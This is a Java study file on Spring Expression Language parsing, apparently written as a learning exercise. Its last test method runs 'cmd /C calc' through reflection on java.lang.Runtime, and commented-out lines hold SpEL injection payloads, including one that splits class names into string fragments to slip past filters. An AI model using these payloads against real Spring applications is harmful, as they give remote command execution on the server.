package com.llu.baseSpelTest;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.expression.spel.support.StandardTypeLocator;

import java.lang.reflect.Method;
import java.util.GregorianCalendar;

public class SpelTest1 {


    // 这种方式是字面调用 测试
    public static void test1() {
        // 定义需要解析的字符串 这种方式是字面调用
        String str = "'xxx'.concat('yyy')";
        // 1 定义解析器
        SpelExpressionParser parser = new SpelExpressionParser();
        // 2 使用解析器解析表达式
        Expression exp = parser.parseExpression(str);
        // 3 获取解析结果
        String value = (String) exp.getValue();
        System.out.println(value);//xxx
    }
    public static void test2() {
        // Create and set a calendar
        GregorianCalendar c = new GregorianCalendar();
        c.set(1856, 7, 9);
        // The constructor arguments are name, birthday, and nationality.
        Inventor tesla = new Inventor("Nikola Tesla", c.getTime(), "Serbian");

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression("name");
        //该字符串变量name的值将被设定为“Nikola Tesla”。 类StandardEvaluationContext是可以指定哪些对象的“name” 属性将被解析。
        EvaluationContext context = new StandardEvaluationContext(tesla);
        String name = (String) exp.getValue(context);
        System.out.println(name);
    }
    public static void test3() {
        User user = new User();
        user.setName("xxx");
        User user2 = new User();
        user2.setName(user.getName());

        // 1 定义解析器
        ExpressionParser parser = new SpelExpressionParser();
        // 指定表达式
        Expression exp = parser.parseExpression("name");
        // 2 使用解析器解析表达式，获取对象的属性值
        String name = (String) exp.getValue(user2);
        // 3 获取解析结果
        System.out.println(name);//xxx

        // 2.1 使用解析器解析表达式，获取对象的属性值并进行运算
        Expression exp2 = parser.parseExpression("name == 'xxx'");
        // 3.1 获取解析结果
        boolean result = exp2.getValue(user2, Boolean.class);
        System.out.println(result);//true

    }
    public static void test4() {
        // 使用字符串创建表达式
//        String str = "'hello'"; // hello
        // 使用Java对象直接new
//        String str = "new String('Hello Word') "; // Hello Word
        // 使用 T(type) ,引用常量和静态方法
//        String str = "T(java.lang.String).valueOf(123)";
        String str = "6*6";
        StandardEvaluationContext standardEvaluationContext = new StandardEvaluationContext();

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(str);

        System.out.println(exp.getValue(standardEvaluationContext));
    }

    /**
     * 打印SpEl 内部类型声明
     */
    public static void test5() {

        // 创建 SpEL 解析器
        ExpressionParser parser = new SpelExpressionParser();
        // 创建标准的 EvaluationContext
        StandardEvaluationContext context = new StandardEvaluationContext();

        // 获取 StandardTypeLocator 用于访问内置的类
        StandardTypeLocator typeLocator = (StandardTypeLocator) context.getTypeLocator();

        System.out.println(typeLocator); //java.lang

    }
    public static void test6() throws Exception {
        String s = new String("a");
        Class<?> aClass = s.getClass();
        Class<?> aClass1 = aClass.forName("java.lang.Runtime");
        Method exec = aClass1.getMethod("exec", String.class);
//        Runtime runtime = Runtime.getRuntime();
//        runtime.exec("");
        Method getRuntime = aClass1.getMethod("getRuntime");
        Object runtime = getRuntime.invoke(null);
        exec.invoke(runtime,new String("cmd /C calc"));



//
//        System.out.println("----------------");
//            String spel = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))" +
//                    ".invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")" +
//                    ".getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()" +
//                    ".forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})\n";
//        String spel ="new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";
//            String spel ="T(java.lang.Runtime).getRuntime().exec(\"calc\")";
//            ExpressionParser parser=new SpelExpressionParser();
//            Expression expression=parser.parseExpression(spel);
//            EvaluationContext context=new StandardEvaluationContext();
//            expression.getValue(context);

    }

    public static void main(String[] args) throws Exception {
        test4();

    }
}
